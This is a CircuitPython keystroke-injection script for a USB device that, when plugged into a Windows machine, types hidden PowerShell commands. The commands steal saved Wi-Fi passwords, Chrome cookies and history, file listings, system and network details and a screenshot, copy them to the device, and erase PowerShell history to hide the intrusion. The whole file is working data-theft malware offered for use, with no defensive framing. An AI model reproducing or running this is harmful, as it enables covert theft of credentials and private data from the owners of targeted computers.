"""
Exfiltration:
- CIRCUITPY/exfil/ (fichiers individuels)
- CIRCUITPY/exfil/data_YYYYMMDD_HHMMSS.zip
"""

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from keycode_win_fr import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

def press_combo(*keys):
    keyboard.press(*keys)
    time.sleep(0.1)
    keyboard.release_all()
    time.sleep(0.1)

def press_enter():
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.3)

time.sleep(2)

press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
layout.write("powershell -W Hidden -NoP -NonI -Exec Bypass")
press_enter()
time.sleep(1.5)

commands = [
    "$d=$env:TEMP+'\\'+[System.IO.Path]::GetRandomFileName().Split('.')[0];",
    "mkdir $d|Out-Null;",
    
    "(netsh wlan show profiles)|sls '\\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();(netsh wlan show profile name=$n key=clear)}|Out-File $d\\w.txt;",
    
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies' $d\\c.db -EA SilentlyContinue};",
    
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History' $d\\h.db -EA SilentlyContinue};",
    
    "gci $env:USERPROFILE\\Documents -R -EA SilentlyContinue|select FullName,LastWriteTime|Out-File $d\\docs.txt;",
    "gci $env:USERPROFILE\\Desktop -R -EA SilentlyContinue|select FullName,LastWriteTime|Out-File $d\\desk.txt;",
    "gci $env:USERPROFILE\\Downloads -R -EA SilentlyContinue|select FullName,LastWriteTime|Out-File $d\\dl.txt;",
    
    "Get-ComputerInfo|select CsName,OsName,CsDomain,CsUserName|Out-File $d\\sys.txt;",
    "Get-NetIPAddress|select IPAddress,InterfaceAlias|Out-File $d\\net.txt;",
    
    "Add-Type -A System.Windows.Forms;",
    "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;",
    "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);",
    "$g=[System.Drawing.Graphics]::FromImage($b);",
    "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);",
    "$b.Save(\"$d\\screen.png\");",
    
    "$usb=(gwmi win32_volume|?{$_.Label -eq 'CIRCUITPY' -or $_.Label -eq 'RPI-RP2'}).DriveLetter;",
    'if($usb){if(!(Test-Path "$usb\\exfil")){mkdir "$usb\\exfil" | Out-Null}};',
    
    'if($usb){Copy-Item $d\\* "$usb\\exfil\\" -Recurse -Force -EA SilentlyContinue};',
    
    'if($usb){Compress-Archive -Path $d\\* -DestinationPath "$usb\\exfil\\data_$(Get-Date -Format "yyyyMMdd_HHmmss").zip" -CompressionLevel Fastest -EA SilentlyContinue};',
    
    "Start-Sleep -Seconds 1;",
    "Remove-Item -Recurse -Force $d -EA SilentlyContinue;",
    "Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue;",
    "Clear-History;",
    "exit"
]

for cmd in commands:
    layout.write(cmd)
    press_enter()
    time.sleep(0.15)
